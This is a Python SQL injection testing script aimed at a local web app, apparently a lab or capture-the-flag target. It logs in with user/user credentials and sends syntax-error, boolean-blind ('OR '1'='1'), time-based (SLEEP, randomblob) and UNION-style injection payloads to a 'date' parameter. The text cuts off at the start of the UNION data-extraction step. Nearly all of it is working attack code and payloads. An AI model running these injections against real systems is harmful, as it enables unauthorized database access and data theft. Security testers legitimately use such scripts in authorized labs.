import requests
import re
import time

# Target configuration  
BASE_URL = "http://127.0.0.1:32997"
LOGIN_URL = f"{BASE_URL}/login"
REMIND_URL = f"{BASE_URL}/remind"

# Create a session
session = requests.Session()

print("="*70)
print("DETAILED SQL INJECTION ANALYSIS")
print("="*70)

# Step 1: Login
login_data = {'username': 'user', 'password': 'user'}
login_resp = session.post(LOGIN_URL, data=login_data, allow_redirects=False)

# Extract and set session cookie
set_cookie = login_resp.headers.get('set-cookie')
if set_cookie:
    cookie_match = re.search(r'session=([^;]+)', set_cookie)
    if cookie_match:
        session.cookies.set('session', cookie_match.group(1))

print("\n[+] Authentication successful")

# Get baseline
baseline = session.get(f"{REMIND_URL}?date=2024-01-01")
print(f"[+] Baseline response for date=2024-01-01:")
print(f"    Status: {baseline.status_code}")
print(f"    Length: {len(baseline.text)}B")

# Extract the "Reminder will be sent on" message
reminder_match = re.search(r'Reminder will be sent on ([^<]+)', baseline.text)
if reminder_match:
    baseline_message = reminder_match.group(1).strip()
    print(f"    Message: {baseline_message}")
baseline_len = len(baseline.text)

print("\n" + "="*70)
print("TEST 1: SYNTAX ERROR INJECTION")
print("="*70)

syntax_payloads = [
    ("Single quote", "'"),
    ("Double quote", '"'),
    ("Backslash", "\\"),
    ("Unclosed paren", "')"),
    ("Multiple quotes", "'''"),
    ("Quote-paren", "')"),
    ("Semicolon", "';"),
    ("Null byte", "%00"),
]

print("\n[+] Testing payloads that would cause SQL syntax errors...")
syntax_results = []

for desc, payload in syntax_payloads:
    url = f"{REMIND_URL}?date={payload}"
    resp = session.get(url)
    
    # Extract reminder message
    msg_match = re.search(r'Reminder will be sent on ([^<]+)', resp.text)
    msg = msg_match.group(1).strip() if msg_match else "N/A"
    
    # Check for SQL errors
    sql_errors = re.findall(r'(sqlite|mysql|error|syntax|operational|database|constraint)', resp.text, re.I)
    has_500 = resp.status_code == 500
    
    diff = len(resp.text) - baseline_len
    
    result = {
        'desc': desc,
        'payload': payload,
        'status': resp.status_code,
        'diff': diff,
        'message': msg,
        'errors': sql_errors,
        'vulnerable': bool(sql_errors) or has_500
    }
    syntax_results.append(result)
    
    if sql_errors or has_500:
        print(f"\n[!] {desc}: POTENTIAL VULNERABILITY!")
        print(f"    Payload: {payload}")
        print(f"    Status: {resp.status_code}")
        print(f"    SQL Errors: {sql_errors}")
        print(f"    Message shown: {msg[:100]}")
    else:
        print(f"[*] {desc}: Status={resp.status_code}, Diff={diff:+d}")

print("\n" + "="*70)
print("TEST 2: BOOLEAN-BASED BLIND SQLi")
print("="*70)

print("\n[+] Testing boolean conditions...")

boolean_payloads = [
    ("AND 1=1 (should match baseline)", "2024-01-01' AND 1=1--", "same"),
    ("AND 1=0 (should be different)", "2024-01-01' AND 1=0--", "different"),
    ("OR 1=1 (always true)", "2024-01-01' OR '1'='1", "same"),
    ("OR 1=0 (same as input)", "2024-01-01' OR '1'='0", "same"),
]

boolean_results = []
for desc, payload, expected in boolean_payloads:
    url = f"{REMIND_URL}?date={payload}"
    resp = session.get(url)
    
    msg_match = re.search(r'Reminder will be sent on ([^<]+)', resp.text)
    msg = msg_match.group(1).strip() if msg_match else "N/A"
    
    diff = len(resp.text) - baseline_len
    
    print(f"[*] {desc}")
    print(f"    Payload: {payload}")
    print(f"    Status: {resp.status_code}, Diff: {diff:+d}")
    print(f"    Message: {msg[:80]}")
    
    boolean_results.append({
        'desc': desc,
        'payload': payload,
        'status': resp.status_code,
        'message': msg,
        'diff': diff
    })

print("\n" + "="*70)
print("TEST 3: TIME-BASED SQL INJECTION")
print("="*70)

print("\n[+] Testing time-based payloads (measure response times)...")

time_payloads = [
    ("SQLite sleep", "2024-01-01' AND randomblob(1000000000)--"),
    ("MySQL sleep", "2024-01-01' AND SLEEP(5)--"),
    ("Heavy query", "2024-01-01' AND (SELECT count(*) FROM sqlite_master WHERE random() % 2)--"),
]

for desc, payload in time_payloads:
    url = f"{REMIND_URL}?date={payload}"
    
    start = time.time()
    resp = session.get(url, timeout=10)
    elapsed = time.time() - start
    
    print(f"[*] {desc}: {elapsed:.2f}s")
    print(f"    Payload: {payload[:50]}...")
    print(f"    Status: {resp.status_code}, Length: {len(resp.text)}")
    
    if elapsed > 3:
        print(f"[!] POTENTIAL TIME-BASED SQLi - took {elapsed:.2f}s!")

print("\n" + "="*70)
print("TEST 4: UNION SELECT DATA EXTRACTION")
